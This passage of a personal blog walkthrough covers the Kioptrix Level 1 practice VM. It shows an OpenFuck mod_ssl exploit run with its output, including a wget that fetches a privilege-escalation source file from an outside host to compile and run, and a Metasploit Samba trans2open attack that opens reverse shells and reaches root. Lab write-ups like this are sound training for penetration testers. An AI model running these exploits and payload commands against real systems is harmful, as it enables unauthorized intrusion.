+</span></span><span style=display:flex><span>	0x1f - FreeBSD (apache-1.3.14)
+</span></span><span style=display:flex><span>	0x20 - FreeBSD (apache-1.3.14)
+</span></span><span style=display:flex><span>	0x21 - FreeBSD (apache-1.3.14)
+</span></span><span style=display:flex><span>	0x22 - FreeBSD (apache-1.3.14)
+</span></span><span style=display:flex><span>	0x23 - FreeBSD (apache-1.3.14)
+</span></span><span style=display:flex><span>	0x24 - FreeBSD (apache-1.3.17_1)
+</span></span><span style=display:flex><span>	0x25 - FreeBSD (apache-1.3.19)
+</span></span><span style=display:flex><span>	0x26 - FreeBSD (apache-1.3.19_1)
+</span></span><span style=display:flex><span>	0x27 - FreeBSD (apache-1.3.20)
+</span></span><span style=display:flex><span>	0x28 - FreeBSD (apache-1.3.20)
+</span></span><span style=display:flex><span>	0x29 - FreeBSD (apache-1.3.20+2.8.4)
+</span></span><span style=display:flex><span>	0x2a - FreeBSD (apache-1.3.20_1)
+</span></span><span style=display:flex><span>	0x2b - FreeBSD (apache-1.3.22)
+</span></span><span style=display:flex><span>	0x2c - FreeBSD (apache-1.3.22_7)
+</span></span><span style=display:flex><span>	0x2d - FreeBSD (apache_fp-1.3.23)
+</span></span><span style=display:flex><span>	0x2e - FreeBSD (apache-1.3.24_7)
+</span></span><span style=display:flex><span>	0x2f - FreeBSD (apache-1.3.24+2.8.8)
+</span></span><span style=display:flex><span>	0x30 - FreeBSD 4.6.2-Release-p6 (apache-1.3.26)
+</span></span><span style=display:flex><span>	0x31 - FreeBSD 4.6-Realease (apache-1.3.26)
+</span></span><span style=display:flex><span>	0x32 - FreeBSD (apache-1.3.27)
+</span></span><span style=display:flex><span>	0x33 - Gentoo Linux (apache-1.3.24-r2)
+</span></span><span style=display:flex><span>	0x34 - Linux Generic (apache-1.3.14)
+</span></span><span style=display:flex><span>	0x35 - Mandrake Linux X.x (apache-1.3.22-10.1mdk)
+</span></span><span style=display:flex><span>	0x36 - Mandrake Linux 7.1 (apache-1.3.14-2)
+</span></span><span style=display:flex><span>	0x37 - Mandrake Linux 7.1 (apache-1.3.22-1.4mdk)
+</span></span><span style=display:flex><span>	0x38 - Mandrake Linux 7.2 (apache-1.3.14-2mdk)
+</span></span><span style=display:flex><span>	0x39 - Mandrake Linux 7.2 (apache-1.3.14) 2
+</span></span><span style=display:flex><span>	0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)
+</span></span><span style=display:flex><span>	0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)
+</span></span><span style=display:flex><span>	0x3c - Mandrake Linux 7.2 (apache-1.3.22-1.3mdk)
+</span></span><span style=display:flex><span>	0x3d - Mandrake Linux 7.2 (apache-1.3.22-10.2mdk)
+</span></span><span style=display:flex><span>	0x3e - Mandrake Linux 8.0 (apache-1.3.19-3)
+</span></span><span style=display:flex><span>	0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)
+</span></span><span style=display:flex><span>	0x40 - Mandrake Linux 8.2 (apache-1.3.23-4)
+</span></span><span style=display:flex><span>	0x41 - Mandrake Linux 8.2 #2 (apache-1.3.23-4)
+</span></span><span style=display:flex><span>	0x42 - Mandrake Linux 8.2 (apache-1.3.24)
+</span></span><span style=display:flex><span>	0x43 - Mandrake Linux 9 (apache-1.3.26)
+</span></span><span style=display:flex><span>	0x44 - RedHat Linux ?.? GENERIC (apache-1.3.12-1)
+</span></span><span style=display:flex><span>	0x45 - RedHat Linux TEST1 (apache-1.3.12-1)
+</span></span><span style=display:flex><span>	0x46 - RedHat Linux TEST2 (apache-1.3.12-1)
+</span></span><span style=display:flex><span>	0x47 - RedHat Linux GENERIC (marumbi) (apache-1.2.6-5)
+</span></span><span style=display:flex><span>	0x48 - RedHat Linux 4.2 (apache-1.1.3-3)
+</span></span><span style=display:flex><span>	0x49 - RedHat Linux 5.0 (apache-1.2.4-4)
+</span></span><span style=display:flex><span>	0x4a - RedHat Linux 5.1-Update (apache-1.2.6)
+</span></span><span style=display:flex><span>	0x4b - RedHat Linux 5.1 (apache-1.2.6-4)
+</span></span><span style=display:flex><span>	0x4c - RedHat Linux 5.2 (apache-1.3.3-1)
+</span></span><span style=display:flex><span>	0x4d - RedHat Linux 5.2-Update (apache-1.3.14-2.5.x)
+</span></span><span style=display:flex><span>	0x4e - RedHat Linux 6.0 (apache-1.3.6-7)
+</span></span><span style=display:flex><span>	0x4f - RedHat Linux 6.0 (apache-1.3.6-7)
+</span></span><span style=display:flex><span>	0x50 - RedHat Linux 6.0-Update (apache-1.3.14-2.6.2)
+</span></span><span style=display:flex><span>	0x51 - RedHat Linux 6.0 Update (apache-1.3.24)
+</span></span><span style=display:flex><span>	0x52 - RedHat Linux 6.1 (apache-1.3.9-4)1
+</span></span><span style=display:flex><span>	0x53 - RedHat Linux 6.1 (apache-1.3.9-4)2
+</span></span><span style=display:flex><span>	0x54 - RedHat Linux 6.1-Update (apache-1.3.14-2.6.2)
+</span></span><span style=display:flex><span>	0x55 - RedHat Linux 6.1-fp2000 (apache-1.3.26)
+</span></span><span style=display:flex><span>	0x56 - RedHat Linux 6.2 (apache-1.3.12-2)1
+</span></span><span style=display:flex><span>	0x57 - RedHat Linux 6.2 (apache-1.3.12-2)2
+</span></span><span style=display:flex><span>	0x58 - RedHat Linux 6.2 mod(apache-1.3.12-2)3
+</span></span><span style=display:flex><span>	0x59 - RedHat Linux 6.2 update (apache-1.3.22-5.6)1
+</span></span><span style=display:flex><span>	0x5a - RedHat Linux 6.2-Update (apache-1.3.22-5.6)2
+</span></span><span style=display:flex><span>	0x5b - Redhat Linux 7.x (apache-1.3.22)
+</span></span><span style=display:flex><span>	0x5c - RedHat Linux 7.x (apache-1.3.26-1)
+</span></span><span style=display:flex><span>	0x5d - RedHat Linux 7.x (apache-1.3.27)
+</span></span><span style=display:flex><span>	0x5e - RedHat Linux 7.0 (apache-1.3.12-25)1
+</span></span><span style=display:flex><span>	0x5f - RedHat Linux 7.0 (apache-1.3.12-25)2
+</span></span><span style=display:flex><span>	0x60 - RedHat Linux 7.0 (apache-1.3.14-2)
+</span></span><span style=display:flex><span>	0x61 - RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)
+</span></span><span style=display:flex><span>	0x62 - RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)
+</span></span><span style=display:flex><span>	0x63 - RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)
+</span></span><span style=display:flex><span>	0x64 - RedHat Linux 7.1 (apache-1.3.19-5)1
+</span></span><span style=display:flex><span>	0x65 - RedHat Linux 7.1 (apache-1.3.19-5)2
+</span></span><span style=display:flex><span>	0x66 - RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)
+</span></span><span style=display:flex><span>	0x67 - RedHat Linux 7.1-Update (1.3.22-5.7.1)
+</span></span><span style=display:flex><span>	0x68 - RedHat Linux 7.1 (apache-1.3.22-src)
+</span></span><span style=display:flex><span>	0x69 - RedHat Linux 7.1-Update (1.3.27-1.7.1)
+</span></span><span style=display:flex><span>	0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
+</span></span><span style=display:flex><span>	0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
+</span></span><span style=display:flex><span>	0x6c - RedHat Linux 7.2-Update (apache-1.3.22-6)
+</span></span><span style=display:flex><span>	0x6d - RedHat Linux 7.2 (apache-1.3.24)
+</span></span><span style=display:flex><span>	0x6e - RedHat Linux 7.2 (apache-1.3.26)
+</span></span><span style=display:flex><span>	0x6f - RedHat Linux 7.2 (apache-1.3.26-snc)
+</span></span><span style=display:flex><span>	0x70 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)1
+</span></span><span style=display:flex><span>	0x71 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)2
+</span></span><span style=display:flex><span>	0x72 - RedHat Linux 7.2-Update (apache-1.3.27-1.7.2)
+</span></span><span style=display:flex><span>	0x73 - RedHat Linux 7.3 (apache-1.3.23-11)1
+</span></span><span style=display:flex><span>	0x74 - RedHat Linux 7.3 (apache-1.3.23-11)2
+</span></span><span style=display:flex><span>	0x75 - RedHat Linux 7.3 (apache-1.3.27)
+</span></span><span style=display:flex><span>	0x76 - RedHat Linux 8.0 (apache-1.3.27)
+</span></span><span style=display:flex><span>	0x77 - RedHat Linux 8.0-second (apache-1.3.27)
+</span></span><span style=display:flex><span>	0x78 - RedHat Linux 8.0 (apache-2.0.40)
+</span></span><span style=display:flex><span>	0x79 - Slackware Linux 4.0 (apache-1.3.6)
+</span></span><span style=display:flex><span>	0x7a - Slackware Linux 7.0 (apache-1.3.9)
+</span></span><span style=display:flex><span>	0x7b - Slackware Linux 7.0 (apache-1.3.26)
+</span></span><span style=display:flex><span>	0x7c - Slackware 7.0  (apache-1.3.26)2
+</span></span><span style=display:flex><span>	0x7d - Slackware Linux 7.1 (apache-1.3.12)
+</span></span><span style=display:flex><span>	0x7e - Slackware Linux 8.0 (apache-1.3.20)
+</span></span><span style=display:flex><span>	0x7f - Slackware Linux 8.1 (apache-1.3.24)
+</span></span><span style=display:flex><span>	0x80 - Slackware Linux 8.1 (apache-1.3.26)
+</span></span><span style=display:flex><span>	0x81 - Slackware Linux 8.1-stable (apache-1.3.26)
+</span></span><span style=display:flex><span>	0x82 - Slackware Linux (apache-1.3.27)
+</span></span><span style=display:flex><span>	0x83 - SuSE Linux 7.0 (apache-1.3.12)
+</span></span><span style=display:flex><span>	0x84 - SuSE Linux 7.1 (apache-1.3.17)
+</span></span><span style=display:flex><span>	0x85 - SuSE Linux 7.2 (apache-1.3.19)
+</span></span><span style=display:flex><span>	0x86 - SuSE Linux 7.3 (apache-1.3.20)
+</span></span><span style=display:flex><span>	0x87 - SuSE Linux 8.0 (apache-1.3.23)
+</span></span><span style=display:flex><span>	0x88 - SUSE Linux 8.0 (apache-1.3.23-120)
+</span></span><span style=display:flex><span>	0x89 - SuSE Linux 8.0 (apache-1.3.23-137)
+</span></span><span style=display:flex><span>	0x8a - Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Fuck to all guys who like use lamah ddos. Read SRC to have no surprise</span></span></code></pre></div><p>By visiting the website we can see that it is only a test page, but
+it tells us the server is running on top of Red Hat! We also know
+mod_ssl&rsquo;s version, which is 1.3.20. This leaves us with just 2
+possible offsets.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>$ ./47080  | grep -i &#34;redhat&#34; | grep -i 1.3.20
+</span></span><span style=display:flex><span>        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
+</span></span><span style=display:flex><span>        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2</span></span></code></pre></div><p>We can then try to run the exploit against the machine and see if it works&mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>$ ./47080 0x6b 192.168.122.203 443 -c 40
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>******************************************************************
+</span></span><span style=display:flex><span>* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
+</span></span><span style=display:flex><span>******************************************************************
+</span></span><span style=display:flex><span>* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+</span></span><span style=display:flex><span>* #hackarena  irc.brasnet.org                                     *
+</span></span><span style=display:flex><span>* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+</span></span><span style=display:flex><span>* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+</span></span><span style=display:flex><span>* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+</span></span><span style=display:flex><span>******************************************************************
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Connection... 40 of 40
+</span></span><span style=display:flex><span>Establishing SSL connection
+</span></span><span style=display:flex><span>cipher: 0x4043808c   ciphers: 0x80f81c8
+</span></span><span style=display:flex><span>Ready to send shellcode
+</span></span><span style=display:flex><span>Spawning shell...
+</span></span><span style=display:flex><span>bash: no job control in this shell
+</span></span><span style=display:flex><span>bash-2.05$ 
+</span></span><span style=display:flex><span>d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo 
+</span></span><span style=display:flex><span>--11:53:10--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+</span></span><span style=display:flex><span>           =&amp;gt; `ptrace-kmod.c&amp;#x27;
+</span></span><span style=display:flex><span>Connecting to dl.packetstormsecurity.net:443... connected!
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Unable to establish SSL connection.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Unable to establish SSL connection.
+</span></span><span style=display:flex><span>gcc: ptrace-kmod.c: No such file or directory
+</span></span><span style=display:flex><span>gcc: No input files
+</span></span><span style=display:flex><span>rm: cannot remove `ptrace-kmod.c&amp;#x27;: No such file or directory
+</span></span><span style=display:flex><span>bash: ./exploit: No such file or directory
+</span></span><span style=display:flex><span>bash-2.05$ 
+</span></span><span style=display:flex><span>bash-2.05$ id
+</span></span><span style=display:flex><span>id
+</span></span><span style=display:flex><span>uid=48(apache) gid=48(apache) groups=48(apache)
+</span></span><span style=display:flex><span>bash-2.05$</span></span></code></pre></div><p>Which it does. We have user!</p><h1 id=3-privilege-escalation>3. Privilege Escalation</h1><p>From our minimal shell, we can continue enumerating from inside the machine. I
+spent a couple hours searching for misconfigurations and passwords saved on
+files, but could not find any. I then turned my attention to enumerating the
+rest of the services found by nmap. One such service is samba:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>bash-2.05$ find /usr/sbin | grep -i smb
+</span></span><span style=display:flex><span>find /usr/sbin | grep -i smb
+</span></span><span style=display:flex><span>/usr/sbin/smbd
+</span></span><span style=display:flex><span>bash-2.05$ /usr/sbin/smbd -h
+</span></span><span style=display:flex><span>/usr/sbin/smbd -h
+</span></span><span style=display:flex><span>Usage: /usr/sbin/smbd [-DaoPh?V] [-d debuglevel] [-l log basename] [-p port]
+</span></span><span style=display:flex><span>       [-O socket options] [-s services file]
+</span></span><span style=display:flex><span>        -D                    Become a daemon
+</span></span><span style=display:flex><span>        -a                    Append to log file (default)
+</span></span><span style=display:flex><span>        -o                    Overwrite log file, don&amp;#x27;t append
+</span></span><span style=display:flex><span>        -h                    Print usage
+</span></span><span style=display:flex><span>        -?                    Print usage
+</span></span><span style=display:flex><span>        -V                    Print version
+</span></span><span style=display:flex><span>        -d debuglevel         Set the debuglevel
+</span></span><span style=display:flex><span>        -l log basename.      Basename for log/debug files
+</span></span><span style=display:flex><span>        -p port               Listen on the specified port
+</span></span><span style=display:flex><span>        -O socket options     Socket options
+</span></span><span style=display:flex><span>        -s services file.     Filename of services file
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>bash-2.05$ /usr/sbin/smbd -V
+</span></span><span style=display:flex><span>/usr/sbin/smbd -V
+</span></span><span style=display:flex><span>Version 2.2.1a
+</span></span><span style=display:flex><span>bash-2.05$</span></span></code></pre></div><p>Samba 2.2.1 if vulnerable to trans2open overflow using metasploit, as
+indicated by the searchsploit command:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># searchsploit samba 2.2.1
+</span></span><span style=display:flex><span>-------------------------------------------------------------- ---------------------------------
+</span></span><span style=display:flex><span> Exploit Title                                                |  Path
+</span></span><span style=display:flex><span>-------------------------------------------------------------- ---------------------------------
+</span></span><span style=display:flex><span>Samba 2.2.0 &amp;lt; 2.2.8 (OSX) - trans2open Overflow (Metasploit)  | osx/remote/9924.rb
+</span></span><span style=display:flex><span>Samba &amp;lt; 2.2.8 (Linux/BSD) - Remote Code Execution             | multiple/remote/10.c
+</span></span><span style=display:flex><span>Samba &amp;lt; 3.0.20 - Remote Heap Overflow                         | linux/remote/7701.txt
+</span></span><span style=display:flex><span>Samba &amp;lt; 3.6.2 (x86) - Denial of Service (PoC)                 | linux_x86/dos/36741.py
+</span></span><span style=display:flex><span>-------------------------------------------------------------- ---------------------------------
+</span></span><span style=display:flex><span>Shellcodes: No Results</span></span></code></pre></div><p>So, we can launch metasploit and execute the exploit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>$ msfconsole -q
+</span></span><span style=display:flex><span>msf6 &amp;gt; search trans2open
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Matching Modules
+</span></span><span style=display:flex><span>================
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   #  Name                              Disclosure Date  Rank   Check  Description
+</span></span><span style=display:flex><span>   -  ----                              ---------------  ----   -----  -----------
+</span></span><span style=display:flex><span>   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
+</span></span><span style=display:flex><span>   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
+</span></span><span style=display:flex><span>   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
+</span></span><span style=display:flex><span>   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>msf6 &amp;gt; use 1
+</span></span><span style=display:flex><span>[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+</span></span><span style=display:flex><span>msf6 exploit(linux/samba/trans2open) &amp;gt; set RHOSTS 192.168.122.203
+</span></span><span style=display:flex><span>RHOSTS =&amp;gt; 192.168.122.203
+</span></span><span style=display:flex><span>msf6 exploit(linux/samba/trans2open) &amp;gt; set payload linux/x86/shell_reverse_tcp
+</span></span><span style=display:flex><span>payload =&amp;gt; linux/x86/shell_reverse_tcp
+</span></span><span style=display:flex><span>msf6 exploit(linux/samba/trans2open) &amp;gt; run
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>[*] Started reverse TCP handler on 10.42.0.168:4444 
+</span></span><span style=display:flex><span>[*] 192.168.122.203:139 - Trying return address 0xbffffdfc...
+</span></span><span style=display:flex><span>[*] 192.168.122.203:139 - Trying return address 0xbffffcfc...
+</span></span><span style=display:flex><span>[*] 192.168.122.203:139 - Trying return address 0xbffffbfc...
+</span></span><span style=display:flex><span>[*] 192.168.122.203:139 - Trying return address 0xbffffafc...
+</span></span><span style=display:flex><span>[*] 192.168.122.203:139 - Trying return address 0xbffff9fc...
+</span></span><span style=display:flex><span>[*] 192.168.122.203:139 - Trying return address 0xbffff8fc...
+</span></span><span style=display:flex><span>[*] 192.168.122.203:139 - Trying return address 0xbffff7fc...
+</span></span><span style=display:flex><span>[*] 192.168.122.203:139 - Trying return address 0xbffff6fc...
+</span></span><span style=display:flex><span>[*] Command shell session 1 opened (10.42.0.168:4444 -&amp;gt; 192.168.122.203:32822) at 2022-05-04 17:00:46 +0100
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>[*] Command shell session 2 opened (10.42.0.168:4444 -&amp;gt; 192.168.122.203:32823) at 2022-05-04 17:00:47 +0100
+</span></span><span style=display:flex><span>[*] Command shell session 3 opened (10.42.0.168:4444 -&amp;gt; 192.168.122.203:32824) at 2022-05-04 17:00:48 +0100
+</span></span><span style=display:flex><span>[*] Command shell session 4 opened (10.42.0.168:4444 -&amp;gt; 192.168.122.203:32825) at 2022-05-04 17:00:50 +0100
+</span></span><span style=display:flex><span>id
+</span></span><span style=display:flex><span>uid=0(root) gid=0(root) groups=99(nobody)</span></span></code></pre></div><p>Conclusion. This machine got PwN3d!</p></div></article><div class=blog-post-comments><div id=disqus_thread><script type=text/javascript>(function(){var t,e=document.createElement("script");e.type="text/javascript",e.async=!0,t="pyskaratzinger",e.src="//"+t+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com/ class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div></div><div id=footer-post-container><div id=footer-post><div id=nav-footer style=display:none><ul><li><a href=/>Home</a></li><li><a href=/posts>All posts</a></li><li><a href=/tags>Tags</a></li><li><a href=/about>About</a></li></ul></div><div id=toc-footer style=display:none><nav id=TableOfContents></nav></div><div id=share-footer style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fpyska-ratzinger.github.io%2fposts%2f2022-05-06-kioptrix-level-1%2f" aria-label=Facebook><i class="fab fa-facebook fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2fpyska-ratzinger.github.io%2fposts%2f2022-05-06-kioptrix-level-1%2f&text=Kioptix%20Level%201" aria-label=Twitter><i class="fab fa-twitter fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fpyska-ratzinger.github.io%2fposts%2f2022-05-06-kioptrix-level-1%2f&title=Kioptix%20Level%201" aria-label=Linkedin><i class="fab fa-linkedin fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fpyska-ratzinger.github.io%2fposts%2f2022-05-06-kioptrix-level-1%2f&is_video=false&description=Kioptix%20Level%201" aria-label=Pinterest><i class="fab fa-pinterest fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=Kioptix%20Level%201&body=Check out this article: https%3a%2f%2fpyska-ratzinger.github.io%2fposts%2f2022-05-06-kioptrix-level-1%2f" aria-label=Email><i class="fas fa-envelope fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fpyska-ratzinger.github.io%2fposts%2f2022-05-06-kioptrix-level-1%2f&title=Kioptix%20Level%201" aria-label=Pocket><i class="fab fa-get-pocket fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fpyska-ratzinger.github.io%2fposts%2f2022-05-06-kioptrix-level-1%2f&title=Kioptix%20Level%201" aria-label=reddit><i class="fab fa-reddit fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fpyska-ratzinger.github.io%2fposts%2f2022-05-06-kioptrix-level-1%2f&name=Kioptix%20Level%201&description=1.%20Pre-Enumeration%20phase%3a%20Nothing%20to%20do%20here.%20When%20you%20start%20a%20VM%2c%20the%20IP%20address%20is%20usually%20shown%20on%20one%20of%20the%20interfaces.%20In%20my%20case%2c%20the%20VM%20is%20running%20at%20192.168.122.203.%20To%20avoid%20memorizing%20it%2c%20and%20since%20this%20is%20a%20single%20machine%2c%20I%26rsquo%3bve%20modified%20my%20%2fetc%2fhosts%20file%20to%20include%20the%20following%3a%0a192.168.122.203%09lan_kioptix%20Now%2c%20my%20computer%20will%20understand%20lan_kioptix%20is%20an%20address%20that%20points%20to%20our%20vulnerable%20VM%2c%20and%20will%20redirect%20all%20requests%20directed%20at%20this%20address%20to%20the%20VM." aria-label=Tumblr><i class="fab fa-tumblr fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fpyska-ratzinger.github.io%2fposts%2f2022-05-06-kioptrix-level-1%2f&t=Kioptix%20Level%201" aria-label="Hacker News"><i class="fab fa-hacker-news fa-lg" aria-hidden=true></i></a></li></ul></div><div id=actions-footer><a id=menu-toggle class=icon href=# onclick='return $("#nav-footer").toggle(),!1' aria-label=Menu><i class="fas fa-bars fa-lg" aria-hidden=true></i> Menu</a>
+<a id=toc-toggle class=icon href=# onclick='return $("#toc-footer").toggle(),!1' aria-label=TOC><i class="fas fa-list fa-lg" aria-hidden=true></i> TOC</a>
+<a id=share-toggle class=icon href=# onclick='return $("#share-footer").toggle(),!1' aria-label=Share><i class="fas fa-share-alt fa-lg" aria-hidden=true></i> share</a>
+<a id=top style=display:none class=icon href=# onclick='$("html, body").animate({scrollTop:0},"fast")' aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg" aria-hidden=true></i> Top</a></div></div></div><footer id=footer><div class=footer-left>Copyright &copy; 2022 PysKa's Writeups</div><div class=footer-right><nav><ul><li><a href=/>Home</a></li><li><a href=/posts>All posts</a></li><li><a href=/tags>Tags</a></li><li><a href=/about>About</a></li></ul></nav></div></footer></div></body><link rel=stylesheet href=/lib/font-awesome/css/all.min.css><script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+<script src=/js/code-copy.js></script></html>
